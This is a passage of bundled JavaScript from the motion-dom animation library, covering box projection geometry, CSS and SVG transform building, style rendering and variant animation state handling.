			applyBoxDelta(box, delta);
		}
		if (isSharedTransition && hasTransform(node.latestValues)) transformBox(box, node.latestValues, node.layout?.layoutBox);
	}
	/**
	* Snap tree scale back to 1 if it's within a non-perceivable threshold.
	* This will help reduce useless scales getting rendered.
	*/
	if (treeScale.x < TREE_SCALE_SNAP_MAX && treeScale.x > TREE_SCALE_SNAP_MIN) treeScale.x = 1;
	if (treeScale.y < TREE_SCALE_SNAP_MAX && treeScale.y > TREE_SCALE_SNAP_MIN) treeScale.y = 1;
}
function translateAxis(axis, distance) {
	axis.min += distance;
	axis.max += distance;
}
/**
* Apply a transform to an axis from the latest resolved motion values.
* This function basically acts as a bridge between a flat motion value map
* and applyAxisDelta
*/
function transformAxis(axis, axisTranslate, axisScale, boxScale, axisOrigin = .5) {
	applyAxisDelta(axis, axisTranslate, axisScale, mixNumber$1(axis.min, axis.max, axisOrigin), boxScale);
}
function resolveAxisTranslate(value, axis) {
	if (typeof value === "string") return parseFloat(value) / 100 * (axis.max - axis.min);
	return value;
}
/**
* Apply a transform to a box from the latest resolved motion values.
*/
function transformBox(box, transform, sourceBox) {
	const resolveBox = sourceBox ?? box;
	transformAxis(box.x, resolveAxisTranslate(transform.x, resolveBox.x), transform.scaleX, transform.scale, transform.originX);
	transformAxis(box.y, resolveAxisTranslate(transform.y, resolveBox.y), transform.scaleY, transform.scale, transform.originY);
}
// node_modules/motion-dom/dist/es/projection/utils/measure.mjs
function measureViewportBox(instance, transformPoint) {
	return convertBoundingBoxToBox(transformBoxPoints(instance.getBoundingClientRect(), transformPoint));
}
function measurePageBox(element, rootProjectionNode, transformPagePoint) {
	const viewportBox = measureViewportBox(element, transformPagePoint);
	const { scroll } = rootProjectionNode;
	if (scroll) {
		translateAxis(viewportBox.x, scroll.offset.x);
		translateAxis(viewportBox.y, scroll.offset.y);
	}
	return viewportBox;
}
// node_modules/motion-dom/dist/es/render/html/utils/build-transform.mjs
var translateAlias = {
	x: "translateX",
	y: "translateY",
	z: "translateZ",
	transformPerspective: "perspective"
};
var numTransforms = transformPropOrder.length;
/**
* Build a CSS transform style from individual x/y/scale etc properties.
*
* This outputs with a default order of transforms/scales/rotations, this can be customised by
* providing a transformTemplate function.
*/
function buildTransform(latestValues, transform, transformTemplate) {
	let transformString = "";
	let transformIsDefault = true;
	/**
	* Loop over all possible transforms in order, adding the ones that
	* are present to the transform string.
	*/
	for (let i = 0; i < numTransforms; i++) {
		const key = transformPropOrder[i];
		const value = latestValues[key];
		if (value === void 0) continue;
		let valueIsDefault = true;
		if (typeof value === "number") valueIsDefault = value === (key.startsWith("scale") ? 1 : 0);
		else {
			const parsed = parseFloat(value);
			valueIsDefault = key.startsWith("scale") ? parsed === 1 : parsed === 0;
		}
		if (!valueIsDefault || transformTemplate) {
			const valueAsType = getValueAsType(value, numberValueTypes[key]);
			if (!valueIsDefault) {
				transformIsDefault = false;
				const transformName = translateAlias[key] || key;
				transformString += `${transformName}(${valueAsType}) `;
			}
			if (transformTemplate) transform[key] = valueAsType;
		}
	}
	const pathRotation = latestValues.pathRotation;
	if (pathRotation) {
		transformIsDefault = false;
		transformString += `rotate(${getValueAsType(pathRotation, numberValueTypes.pathRotation)}) `;
	}
	transformString = transformString.trim();
	if (transformTemplate) transformString = transformTemplate(transform, transformIsDefault ? "" : transformString);
	else if (transformIsDefault) transformString = "none";
	return transformString;
}
// node_modules/motion-dom/dist/es/render/html/utils/build-styles.mjs
function buildHTMLStyles(state, latestValues, transformTemplate) {
	const { style, vars, transformOrigin } = state;
	let hasTransform = false;
	let hasTransformOrigin = false;
	/**
	* Loop over all our latest animated values and decide whether to handle them
	* as a style or CSS variable.
	*
	* Transforms and transform origins are kept separately for further processing.
	*/
	for (const key in latestValues) {
		const value = latestValues[key];
		if (transformProps.has(key)) {
			hasTransform = true;
			continue;
		} else if (isCSSVariableName(key)) {
			vars[key] = value;
			continue;
		} else {
			const valueAsType = getValueAsType(value, numberValueTypes[key]);
			if (key.startsWith("origin")) {
				hasTransformOrigin = true;
				transformOrigin[key] = valueAsType;
			} else style[key] = valueAsType;
		}
	}
	if (!latestValues.transform) {
		if (hasTransform || transformTemplate) style.transform = buildTransform(latestValues, state.transform, transformTemplate);
		else if (style.transform)
 /**
		* If we have previously created a transform but currently don't have any,
		* reset transform style to none.
		*/
		style.transform = "none";
	}
	/**
	* Build a transformOrigin style. Uses the same defaults as the browser for
	* undefined origins.
	*/
	if (hasTransformOrigin) {
		const { originX = "50%", originY = "50%", originZ = 0 } = transformOrigin;
		style.transformOrigin = `${originX} ${originY} ${originZ}`;
	}
}
// node_modules/motion-dom/dist/es/render/html/utils/render.mjs
function renderHTML(element, { style, vars }, styleProp, projection) {
	const elementStyle = element.style;
	let key;
	for (key in style) elementStyle[key] = style[key];
	projection?.applyProjectionStyles(elementStyle, styleProp);
	for (key in vars) elementStyle.setProperty(key, vars[key]);
}
// node_modules/motion-dom/dist/es/projection/styles/scale-border-radius.mjs
function pixelsToPercent(pixels, axis) {
	if (axis.max === axis.min) return 0;
	return pixels / (axis.max - axis.min) * 100;
}
/**
* We always correct borderRadius as a percentage rather than pixels to reduce paints.
* For example, if you are projecting a box that is 100px wide with a 10px borderRadius
* into a box that is 200px wide with a 20px borderRadius, that is actually a 10%
* borderRadius in both states. If we animate between the two in pixels that will trigger
* a paint each time. If we animate between the two in percentage we'll avoid a paint.
*/
var correctBorderRadius = { correct: (latest, node) => {
	if (!node.target) return latest;
	/**
	* If latest is a string, if it's a percentage we can return immediately as it's
	* going to be stretched appropriately. Otherwise, if it's a pixel, convert it to a number.
	*/
	if (typeof latest === "string") {
		if (px.test(latest)) latest = parseFloat(latest);
		else return latest;
	}
	return `${pixelsToPercent(latest, node.target.x)}% ${pixelsToPercent(latest, node.target.y)}%`;
} };
// node_modules/motion-dom/dist/es/projection/styles/scale-box-shadow.mjs
var correctBoxShadow = { correct: (latest, { treeScale, projectionDelta }) => {
	const original = latest;
	const shadow = complex.parse(latest);
	if (shadow.length > 5) return original;
	const template = complex.createTransformer(latest);
	const offset = typeof shadow[0] !== "number" ? 1 : 0;
	const xScale = projectionDelta.x.scale * treeScale.x;
	const yScale = projectionDelta.y.scale * treeScale.y;
	shadow[0 + offset] /= xScale;
	shadow[1 + offset] /= yScale;
	/**
	* Ideally we'd correct x and y scales individually, but because blur and
	* spread apply to both we have to take a scale average and apply that instead.
	* We could potentially improve the outcome of this by incorporating the ratio between
	* the two scales.
	*/
	const averageScale = mixNumber$1(xScale, yScale, .5);
	if (typeof shadow[2 + offset] === "number") shadow[2 + offset] /= averageScale;
	if (typeof shadow[3 + offset] === "number") shadow[3 + offset] /= averageScale;
	return template(shadow);
} };
// node_modules/motion-dom/dist/es/projection/styles/scale-correction.mjs
var scaleCorrectors = {
	borderRadius: {
		...correctBorderRadius,
		applyTo: [...cornerRadiusProps]
	},
	borderTopLeftRadius: correctBorderRadius,
	borderTopRightRadius: correctBorderRadius,
	borderBottomLeftRadius: correctBorderRadius,
	borderBottomRightRadius: correctBorderRadius,
	boxShadow: correctBoxShadow
};
// node_modules/motion-dom/dist/es/render/utils/is-forced-motion-value.mjs
function isForcedMotionValue(key, { layout, layoutId }) {
	return transformProps.has(key) || key.startsWith("origin") || (layout || layoutId !== void 0) && (!!scaleCorrectors[key] || key === "opacity");
}
// node_modules/motion-dom/dist/es/render/html/utils/scrape-motion-values.mjs
function scrapeMotionValuesFromProps$1(props, prevProps, visualElement) {
	const style = props.style;
	const prevStyle = prevProps?.style;
	const newValues = {};
	if (!style) return newValues;
	for (const key in style) if (isMotionValue(style[key]) || prevStyle && isMotionValue(prevStyle[key]) || isForcedMotionValue(key, props) || visualElement?.getValue(key)?.liveStyle !== void 0) newValues[key] = style[key];
	return newValues;
}
// node_modules/motion-dom/dist/es/render/html/HTMLVisualElement.mjs
function getComputedStyle$1(element) {
	return window.getComputedStyle(element);
}
var HTMLVisualElement = class extends DOMVisualElement {
	constructor() {
		super(...arguments);
		this.type = "html";
		this.renderInstance = renderHTML;
	}
	mount(instance) {
		/**
		* If a custom component forwards its ref to something other than a
		* HTML/SVG element (a class instance, an imperative handle) there's
		* nothing for Motion to style, measure or attach gestures to. #2777
		*/
		Boolean(instance.style);
		super.mount(instance);
	}
	readValueFromInstance(instance, key) {
		if (transformProps.has(key)) return this.projection?.isProjecting ? defaultTransformValue(key) : readTransformValue(instance, key);
		else {
			const computedStyle = getComputedStyle$1(instance);
			const value = (isCSSVariableName(key) ? computedStyle.getPropertyValue(key) : computedStyle[key]) || 0;
			return typeof value === "string" ? value.trim() : value;
		}
	}
	measureInstanceViewportBox(instance, { transformPagePoint }) {
		return measureViewportBox(instance, transformPagePoint);
	}
	build(renderState, latestValues, props) {
		buildHTMLStyles(renderState, latestValues, props.transformTemplate);
	}
	scrapeMotionValuesFromProps(props, prevProps, visualElement) {
		return scrapeMotionValuesFromProps$1(props, prevProps, visualElement);
	}
};
// node_modules/motion-dom/dist/es/render/svg/utils/path.mjs
var dashKeys = {
	offset: "stroke-dashoffset",
	array: "stroke-dasharray"
};
var camelKeys = {
	offset: "strokeDashoffset",
	array: "strokeDasharray"
};
/**
* Build SVG path properties. Uses the path's measured length to convert
* our custom pathLength, pathSpacing and pathOffset into stroke-dashoffset
* and stroke-dasharray attributes.
*
* This function is mutative to reduce per-frame GC.
*
* Note: We use unitless values for stroke-dasharray and stroke-dashoffset
* because Safari incorrectly scales px values when the page is zoomed.
*/
function buildSVGPath(attrs, length, spacing = 1, offset = 0, useDashCase = true) {
	attrs.pathLength = 1;
	const keys = useDashCase ? dashKeys : camelKeys;
	attrs[keys.offset] = `${-offset}`;
	attrs[keys.array] = `${length} ${spacing}`;
}
// node_modules/motion-dom/dist/es/render/svg/utils/build-attrs.mjs
/**
* CSS Motion Path properties that should remain as CSS styles on SVG elements.
*/
var cssMotionPathProperties = [
	"offsetDistance",
	"offsetPath",
	"offsetRotate",
	"offsetAnchor"
];
/**
* Build SVG visual attributes, like cx and style.transform
*/
function buildSVGAttrs(state, { attrX, attrY, attrScale, pathLength, pathSpacing = 1, pathOffset = 0, ...latest }, isSVGTag, transformTemplate, styleProp) {
	buildHTMLStyles(state, latest, transformTemplate);
	/**
	* For svg tags we just want to make sure viewBox is animatable and treat all the styles
	* as normal HTML tags.
	*/
	if (isSVGTag) {
		if (state.style.viewBox) state.attrs.viewBox = state.style.viewBox;
		return;
	}
	state.attrs = state.style;
	state.style = {};
	const { attrs, style } = state;
	/**
	* However, we apply transforms as CSS transforms.
	* So if we detect a transform, transformOrigin we take it from attrs and copy it into style.
	*/
	if (attrs.transform) {
		style.transform = attrs.transform;
		delete attrs.transform;
	}
	if (style.transform || attrs.transformOrigin) {
		style.transformOrigin = attrs.transformOrigin ?? "50% 50%";
		delete attrs.transformOrigin;
	}
	if (style.transform) {
		/**
		* SVG's element transform-origin uses its own median as a reference.
		* Therefore, transformBox becomes a fill-box
		*/
		style.transformBox = styleProp?.transformBox ?? "fill-box";
		delete attrs.transformBox;
	}
	for (const key of cssMotionPathProperties) if (attrs[key] !== void 0) {
		style[key] = attrs[key];
		delete attrs[key];
	}
	if (attrX !== void 0) attrs.x = attrX;
	if (attrY !== void 0) attrs.y = attrY;
	if (attrScale !== void 0) attrs.scale = attrScale;
	if (pathLength !== void 0) buildSVGPath(attrs, pathLength, pathSpacing, pathOffset, false);
}
// node_modules/motion-dom/dist/es/render/svg/utils/camel-case-attrs.mjs
/**
* A set of attribute names that are always read/written as camel case.
*/
var camelCaseAttributes = /* @__PURE__ */ new Set([
	"baseFrequency",
	"diffuseConstant",
	"kernelMatrix",
	"kernelUnitLength",
	"keySplines",
	"keyTimes",
	"limitingConeAngle",
	"markerHeight",
	"markerWidth",
	"numOctaves",
	"targetX",
	"targetY",
	"surfaceScale",
	"specularConstant",
	"specularExponent",
	"stdDeviation",
	"tableValues",
	"viewBox",
	"gradientTransform",
	"pathLength",
	"startOffset",
	"textLength",
	"lengthAdjust"
]);
// node_modules/motion-dom/dist/es/render/svg/utils/is-svg-tag.mjs
var isSVGTag = (tag) => typeof tag === "string" && tag.toLowerCase() === "svg";
// node_modules/motion-dom/dist/es/render/svg/utils/render.mjs
function renderSVG(element, renderState, _styleProp, projection) {
	renderHTML(element, renderState, void 0, projection);
	for (const key in renderState.attrs) element.setAttribute(!camelCaseAttributes.has(key) ? camelToDash(key) : key, renderState.attrs[key]);
}
// node_modules/motion-dom/dist/es/render/svg/utils/scrape-motion-values.mjs
function scrapeMotionValuesFromProps(props, prevProps, visualElement) {
	const newValues = scrapeMotionValuesFromProps$1(props, prevProps, visualElement);
	for (const key in props) if (isMotionValue(props[key]) || isMotionValue(prevProps[key])) {
		const targetKey = transformPropOrder.indexOf(key) !== -1 ? "attr" + key.charAt(0).toUpperCase() + key.substring(1) : key;
		newValues[targetKey] = props[key];
	}
	return newValues;
}
// node_modules/motion-dom/dist/es/render/svg/SVGVisualElement.mjs
var SVGVisualElement = class extends DOMVisualElement {
	constructor() {
		super(...arguments);
		this.type = "svg";
		this.isSVGTag = false;
		this.measureInstanceViewportBox = createBox;
	}
	getBaseTargetFromProps(props, key) {
		return props[key];
	}
	readValueFromInstance(instance, key) {
		if (transformProps.has(key)) {
			const defaultType = getDefaultValueType(key);
			return defaultType ? defaultType.default || 0 : 0;
		}
		key = !camelCaseAttributes.has(key) ? camelToDash(key) : key;
		return instance.getAttribute(key);
	}
	scrapeMotionValuesFromProps(props, prevProps, visualElement) {
		return scrapeMotionValuesFromProps(props, prevProps, visualElement);
	}
	build(renderState, latestValues, props) {
		buildSVGAttrs(renderState, latestValues, this.isSVGTag, props.transformTemplate, props.style);
	}
	renderInstance(instance, renderState, styleProp, projection) {
		renderSVG(instance, renderState, styleProp, projection);
	}
	mount(instance) {
		this.isSVGTag = isSVGTag(instance.tagName);
		super.mount(instance);
	}
};
// node_modules/motion-dom/dist/es/render/utils/get-variant-context.mjs
var numVariantProps = variantProps.length;
/**
* Get variant context from a visual element's parent chain.
* Uses `any` type for visualElement to avoid circular dependencies.
*/
function getVariantContext(visualElement) {
	if (!visualElement) return void 0;
	if (!visualElement.isControllingVariants) {
		const context = visualElement.parent ? getVariantContext(visualElement.parent) || {} : {};
		if (visualElement.props.initial !== void 0) context.initial = visualElement.props.initial;
		return context;
	}
	const context = {};
	for (let i = 0; i < numVariantProps; i++) {
		const name = variantProps[i];
		const prop = visualElement.props[name];
		if (isVariantLabel(prop) || prop === false) context[name] = prop;
	}
	return context;
}
// node_modules/motion-dom/dist/es/render/utils/shallow-compare.mjs
function shallowCompare(next, prev) {
	if (!Array.isArray(prev)) return false;
	const prevLength = prev.length;
	if (prevLength !== next.length) return false;
	for (let i = 0; i < prevLength; i++) if (prev[i] !== next[i]) return false;
	return true;
}
// node_modules/motion-dom/dist/es/render/utils/animation-state.mjs
var reversePriorityOrder = [...variantPriorityOrder].reverse();
var numAnimationTypes = variantPriorityOrder.length;
function createAnimateFunction(visualElement) {
	return (animations) => {
		return Promise.all(animations.map(({ animation, options }) => animateVisualElement(visualElement, animation, options)));
	};
}
function createAnimationState(visualElement) {
	let animate = createAnimateFunction(visualElement);
	let state = createState();
	let isInitialRender = true;
	/**
	* Track whether the animation state has been reset (e.g. via StrictMode
	* double-invocation or Suspense unmount/remount). On the first
	* animateChanges() call after a reset we need to behave like the initial
	* render for variant-inheritance checks, even though isInitialRender is
	* already false.
	*/
	let wasReset = false;
	/**
	* This function will be used to reduce the animation definitions for
	* each active animation type into an object of resolved values for it.
	*/
	const buildResolvedTypeValues = (type) => (acc, definition) => {
		const resolved = resolveVariant(visualElement, definition, type === "exit" ? visualElement.presenceContext?.custom : void 0);
		if (resolved) {
			const { transition, transitionEnd, ...target } = resolved;
			acc = {
				...acc,
				...target,
				...transitionEnd
			};
		}
		return acc;
	};
	/**
	* This just allows us to inject mocked animation functions
	* @internal
	*/
	function setAnimateFunction(makeAnimator) {
		animate = makeAnimator(visualElement);
	}
	/**
	* When we receive new props, we need to:
	* 1. Create a list of protected keys for each type. This is a directory of
	*    value keys that are currently being "handled" by types of a higher priority
	*    so that whenever an animation is played of a given type, these values are
	*    protected from being animated.
	* 2. Determine if an animation type needs animating.
	* 3. Determine if any values have been removed from a type and figure out
	*    what to animate those to.
	*/
	function animateChanges(changedActiveType) {
		const { props } = visualElement;
		const context = getVariantContext(visualElement.parent) || {};
		/**
		* A list of animations that we'll build into as we iterate through the animation
		* types. This will get executed at the end of the function.
		*/
		const animations = [];
		/**
		* Keep track of which values have been removed. Then, as we hit lower priority
		* animation types, we can check if they contain removed values and animate to that.
		*/
		const removedKeys = /* @__PURE__ */ new Set();
		/**
		* A dictionary of all encountered keys. This is an object to let us build into and
		* copy it without iteration. Each time we hit an animation type we set its protected
		* keys - the keys its not allowed to animate - to the latest version of this object.
		*/
		let encounteredKeys = {};
		/**
		* If a variant has been removed at a given index, and this component is controlling
		* variant animations, we want to ensure lower-priority variants are forced to animate.
		*/
		let removedVariantIndex = Infinity;
		/**
		* Iterate through all animation types in reverse priority order. For each, we want to
		* detect which values it's handling and whether or not they've changed (and therefore
		* need to be animated). If any values have been removed, we want to detect those in
		* lower priority props and flag for animation.
		*/
		for (let i = 0; i < numAnimationTypes; i++) {
			const type = reversePriorityOrder[i];
			const typeState = state[type];
			const prop = props[type] !== void 0 ? props[type] : context[type];
			const propIsVariant = isVariantLabel(prop);
			/**
			* If this type has *just* changed isActive status, set activeDelta
			* to that status. Otherwise set to null.
			*/
			const activeDelta = type === changedActiveType ? typeState.isActive : null;
			if (activeDelta === false) removedVariantIndex = i;
			/**
			* If this prop is an inherited variant, rather than been set directly on the
			* component itself, we want to make sure we allow the parent to trigger animations.
			*
			* TODO: Can probably change this to a !isControllingVariants check
			*/
			let isInherited = prop === context[type] && prop !== props[type] && propIsVariant;
			if (isInherited && (isInitialRender || wasReset) && visualElement.manuallyAnimateOnMount) isInherited = false;
			/**
			* Set all encountered keys so far as the protected keys for this type. This will
			* be any key that has been animated or otherwise handled by active, higher-priortiy types.
			*/
			typeState.protectedKeys = { ...encounteredKeys };
			if (!typeState.isActive && activeDelta === null || !prop && !typeState.prevProp || isAnimationControls(prop) || typeof prop === "boolean") continue;
			/**
			* If exit is already active and wasn't just activated, skip
			* re-processing to prevent interrupting running exit animations.
			* Re-resolving exit with a changed custom value can start new
			* value animations that stop the originals, leaving the exit
			* animation promise unresolved and the component stuck in the DOM.
			*/
			if (type === "exit" && typeState.isActive && activeDelta !== true) {
				if (typeState.prevResolvedValues) encounteredKeys = {
					...encounteredKeys,
					...typeState.prevResolvedValues
				};
				continue;
			}
			/**
			* As we go look through the values defined on this type, if we detect
			* a changed value or a value that was removed in a higher priority, we set
			* this to true and add this prop to the animation list.
			*/
			const variantDidChange = checkVariantsDidChange(typeState.prevProp, prop);
			let shouldAnimateType = variantDidChange || type === changedActiveType && typeState.isActive && !isInherited && propIsVariant || i > removedVariantIndex && propIsVariant;
			let handledRemovedValues = false;
			/**
			* As animations can be set as variant lists, variants or target objects, we
			* coerce everything to an array if it isn't one already
			*/
			const definitionList = Array.isArray(prop) ? prop : [prop];
			/**
			* Build an object of all the resolved values. We'll use this in the subsequent
			* animateChanges calls to determine whether a value has changed.
			*/
			let resolvedValues = definitionList.reduce(buildResolvedTypeValues(type), {});
			if (activeDelta === false) resolvedValues = {};
			/**
			* Now we need to loop through all the keys in the prev prop and this prop,
			* and decide:
			* 1. If the value has changed, and needs animating
			* 2. If it has been removed, and needs adding to the removedKeys set
			* 3. If it has been removed in a higher priority type and needs animating
			* 4. If it hasn't been removed in a higher priority but hasn't changed, and
			*    needs adding to the type's protectedKeys list.
			*/
			const { prevResolvedValues = {} } = typeState;
			const allKeys = {
				...prevResolvedValues,
				...resolvedValues
			};
			const markToAnimate = (key) => {
				shouldAnimateType = true;
				if (removedKeys.has(key)) {
					handledRemovedValues = true;
					removedKeys.delete(key);
				}
				typeState.needsAnimating[key] = true;
				const motionValue = visualElement.getValue(key);
				if (motionValue) motionValue.liveStyle = false;
			};
			for (const key in allKeys) {
				const next = resolvedValues[key];
				const prev = prevResolvedValues[key];
				if (encounteredKeys.hasOwnProperty(key)) continue;
				/**
				* If the value has changed, we probably want to animate it.
				*/
				let valueHasChanged = false;
				if (isKeyframesTarget(next) && isKeyframesTarget(prev)) valueHasChanged = !shallowCompare(next, prev) || variantDidChange;
				else valueHasChanged = next !== prev;
				if (valueHasChanged) {
					if (next !== void 0 && next !== null) markToAnimate(key);
					else removedKeys.add(key);
				} else if (next !== void 0 && removedKeys.has(key))
 /**
				* If next hasn't changed and it isn't undefined, we want to check if it's
				* been removed by a higher priority
				*/
				markToAnimate(key);
				else
 /**
				* If it hasn't changed, we add it to the list of protected values
				* to ensure it doesn't get animated.
				*/
				typeState.protectedKeys[key] = true;
			}
			/**
			* Update the typeState so next time animateChanges is called we can compare the
			* latest prop and resolvedValues to these.
			*/
			typeState.prevProp = prop;
			typeState.prevResolvedValues = resolvedValues;
			if (typeState.isActive) encounteredKeys = {
				...encounteredKeys,
				...resolvedValues
			};
			if ((isInitialRender || wasReset) && visualElement.blockInitialAnimation) shouldAnimateType = false;
			/**
			* If this is an inherited prop we want to skip this animation
			* unless the inherited variants haven't changed on this render.
			*/
			const willAnimateViaParent = isInherited && variantDidChange;
			if (shouldAnimateType && (!willAnimateViaParent || handledRemovedValues)) animations.push(...definitionList.map((animation) => {
				const options = { type };
				/**
				* If we're performing the initial animation, but we're not
				* rendering at the same time as the variant-controlling parent,
				* we want to use the parent's transition to calculate the stagger.
				*/
				if (typeof animation === "string" && (isInitialRender || wasReset) && !willAnimateViaParent && visualElement.manuallyAnimateOnMount && visualElement.parent) {
					const { parent } = visualElement;
					const parentVariant = resolveVariant(parent, animation);
					if (parent.enteringChildren && parentVariant) {
						const { delayChildren } = parentVariant.transition || {};
						options.delay = calcChildStagger(parent.enteringChildren, visualElement, delayChildren);
					}
				}
				return {
					animation,
					options
				};
			}));
		}
		/**
		* If there are some removed value that haven't been dealt with,
		* we need to create a new animation that falls back either to the value
		* defined in the style prop, or the last read value.
		*/
		if (removedKeys.size) {
			const fallbackAnimation = {};
			/**
			* If the initial prop contains a transition we can use that, otherwise
			* allow the animation function to use the visual element's default.
			*/
			if (typeof props.initial !== "boolean") {
				const initialTransition = resolveVariant(visualElement, Array.isArray(props.initial) ? props.initial[0] : props.initial);
				if (initialTransition && initialTransition.transition) fallbackAnimation.transition = initialTransition.transition;
			}
			removedKeys.forEach((key) => {
				const fallbackTarget = visualElement.getBaseTarget(key);
				const motionValue = visualElement.getValue(key);
				if (motionValue) motionValue.liveStyle = true;
				fallbackAnimation[key] = fallbackTarget ?? null;
			});
			animations.push({ animation: fallbackAnimation });
		}
		let shouldAnimate = Boolean(animations.length);
		if (isInitialRender && (props.initial === false || props.initial === props.animate) && !visualElement.manuallyAnimateOnMount) shouldAnimate = false;
		isInitialRender = false;
		wasReset = false;
		return shouldAnimate ? animate(animations) : Promise.resolve();
	}
	/**
	* Change whether a certain animation type is active.
	*/
	function setActive(type, isActive) {
		if (state[type].isActive === isActive) return Promise.resolve();
		visualElement.variantChildren?.forEach((child) => child.animationState?.setActive(type, isActive));
		state[type].isActive = isActive;
		const animations = animateChanges(type);
		for (const key in state) state[key].protectedKeys = {};
		return animations;
	}
	return {
		animateChanges,
		setActive,
		setAnimateFunction,
		getState: () => state,
		reset: () => {
			state = createState();
			wasReset = true;
		}
	};
}
function checkVariantsDidChange(prev, next) {
	if (typeof next === "string") return next !== prev;
	else if (Array.isArray(next)) return !shallowCompare(next, prev);
	return false;
}
function createTypeState(isActive = false) {
	return {
		isActive,
		protectedKeys: {},
		needsAnimating: {},
		prevResolvedValues: {}
	};
}
function createState() {
	return {
		animate: createTypeState(true),
		whileInView: createTypeState(),
		whileHover: createTypeState(),
		whileTap: createTypeState(),
		whileDrag: createTypeState(),
		whileFocus: createTypeState(),
		exit: createTypeState()
	};
}
// node_modules/motion-dom/dist/es/projection/geometry/copy.mjs
/**
* Reset an axis to the provided origin box.
*
* This is a mutative operation.
*/
function copyAxisInto(axis, originAxis) {
	axis.min = originAxis.min;
	axis.max = originAxis.max;
}
/**
* Reset a box to the provided origin box.
*
* This is a mutative operation.
*/
function copyBoxInto(box, originBox) {
	copyAxisInto(box.x, originBox.x);
	copyAxisInto(box.y, originBox.y);
}
/**
* Reset a delta to the provided origin box.
*
* This is a mutative operation.
*/
function copyAxisDeltaInto(delta, originDelta) {
	delta.translate = originDelta.translate;
	delta.scale = originDelta.scale;
	delta.originPoint = originDelta.originPoint;
	delta.origin = originDelta.origin;
}
// node_modules/motion-dom/dist/es/projection/geometry/delta-calc.mjs
var SCALE_MIN = .9999;
var SCALE_MAX = 1.0001;
var TRANSLATE_MIN = -.01;
var TRANSLATE_MAX = .01;
function calcLength(axis) {
	return axis.max - axis.min;
}
function isNear(value, target, maxDistance) {
	return Math.abs(value - target) <= maxDistance;
}
function calcAxisDelta(delta, source, target, origin = .5) {
	delta.origin = origin;
	delta.originPoint = mixNumber$1(source.min, source.max, delta.origin);
	delta.scale = calcLength(target) / calcLength(source);
	delta.translate = mixNumber$1(target.min, target.max, delta.origin) - delta.originPoint;
	if (delta.scale >= SCALE_MIN && delta.scale <= SCALE_MAX || isNaN(delta.scale)) delta.scale = 1;
	if (delta.translate >= TRANSLATE_MIN && delta.translate <= TRANSLATE_MAX || isNaN(delta.translate)) delta.translate = 0;
}
function calcBoxDelta(delta, source, target, origin) {
	calcAxisDelta(delta.x, source.x, target.x, origin ? origin.originX : void 0);
	calcAxisDelta(delta.y, source.y, target.y, origin ? origin.originY : void 0);
}
function calcRelativeAxis(target, relative, parent, anchor = 0) {
	target.min = (anchor ? mixNumber$1(parent.min, parent.max, anchor) : parent.min) + relative.min;
	target.max = target.min + calcLength(relative);
}
function calcRelativeBox(target, relative, parent, anchor) {
	calcRelativeAxis(target.x, relative.x, parent.x, anchor?.x);
	calcRelativeAxis(target.y, relative.y, parent.y, anchor?.y);
}
function calcRelativeAxisPosition(target, layout, parent, anchor = 0) {
	const anchorPoint = anchor ? mixNumber$1(parent.min, parent.max, anchor) : parent.min;
	target.min = layout.min - anchorPoint;
	target.max = target.min + calcLength(layout);
}
function calcRelativePosition(target, layout, parent, anchor) {
	calcRelativeAxisPosition(target.x, layout.x, parent.x, anchor?.x);
	calcRelativeAxisPosition(target.y, layout.y, parent.y, anchor?.y);
}
// node_modules/motion-dom/dist/es/projection/geometry/delta-remove.mjs
/**
* Remove a delta from a point. This is essentially the steps of applyPointDelta in reverse
*/
function removePointDelta(point, translate, scale, originPoint, boxScale) {
	point -= translate;
	point = scalePoint(point, 1 / scale, originPoint);
	if (boxScale !== void 0) point = scalePoint(point, 1 / boxScale, originPoint);
	return point;
}
/**
* Remove a delta from an axis. This is essentially the steps of applyAxisDelta in reverse
*/
function removeAxisDelta(axis, translate = 0, scale = 1, origin = .5, boxScale, originAxis = axis, sourceAxis = axis) {
	if (percent.test(translate)) {
		translate = parseFloat(translate);
		translate = mixNumber$1(sourceAxis.min, sourceAxis.max, translate / 100) - sourceAxis.min;
	}
	if (typeof translate !== "number") return;
	let originPoint = mixNumber$1(originAxis.min, originAxis.max, origin);
	if (axis === originAxis) originPoint -= translate;
	axis.min = removePointDelta(axis.min, translate, scale, originPoint, boxScale);
	axis.max = removePointDelta(axis.max, translate, scale, originPoint, boxScale);
}
/**
* Remove a transforms from an axis. This is essentially the steps of applyAxisTransforms in reverse
* and acts as a bridge between motion values and removeAxisDelta
*/
function removeAxisTransforms(axis, transforms, [key, scaleKey, originKey], origin, sourceAxis) {
	removeAxisDelta(axis, transforms[key], transforms[scaleKey], transforms[originKey], transforms.scale, origin, sourceAxis);
}
/**
* The names of the motion values we want to apply as translation, scale and origin.
*/
var xKeys = [
	"x",
	"scaleX",
	"originX"
];
var yKeys = [
	"y",
	"scaleY",
	"originY"
];
/**
* Remove a transforms from an box. This is essentially the steps of applyAxisBox in reverse
* and acts as a bridge between motion values and removeAxisDelta
*/
function removeBoxTransforms(box, transforms, originBox, sourceBox) {
	removeAxisTransforms(box.x, transforms, xKeys, originBox ? originBox.x : void 0, sourceBox ? sourceBox.x : void 0);
	removeAxisTransforms(box.y, transforms, yKeys, originBox ? originBox.y : void 0, sourceBox ? sourceBox.y : void 0);
}
// node_modules/motion-dom/dist/es/projection/geometry/utils.mjs
function isAxisDeltaZero(delta) {
	return delta.translate === 0 && delta.scale === 1;
}
function isDeltaZero(delta) {
	return isAxisDeltaZero(delta.x) && isAxisDeltaZero(delta.y);
}
function axisEquals(a, b) {
	return a.min === b.min && a.max === b.max;
}
function boxEquals(a, b) {
	return axisEquals(a.x, b.x) && axisEquals(a.y, b.y);
}
function axisEqualsRounded(a, b) {
	return Math.round(a.min) === Math.round(b.min) && Math.round(a.max) === Math.round(b.max);
}
function boxEqualsRounded(a, b) {
	return axisEqualsRounded(a.x, b.x) && axisEqualsRounded(a.y, b.y);
}
function aspectRatio(box) {
	return calcLength(box.x) / calcLength(box.y);
}
function axisDeltaEquals(a, b) {
	return a.translate === b.translate && a.scale === b.scale && a.originPoint === b.originPoint;
}
// node_modules/motion-dom/dist/es/projection/utils/each-axis.mjs
function eachAxis(callback) {
	return [callback("x"), callback("y")];
}
// node_modules/motion-dom/dist/es/projection/styles/transform.mjs
function buildProjectionTransform(delta, treeScale, latestTransform) {
	let transform = "";
	/**
	* The translations we use to calculate are always relative to the viewport coordinate space.
	* But when we apply scales, we also scale the coordinate space of an element and its children.
	* For instance if we have a treeScale (the culmination of all parent scales) of 0.5 and we need
	* to move an element 100 pixels, we actually need to move it 200 in within that scaled space.
	*/
	const xTranslate = delta.x.translate / treeScale.x;
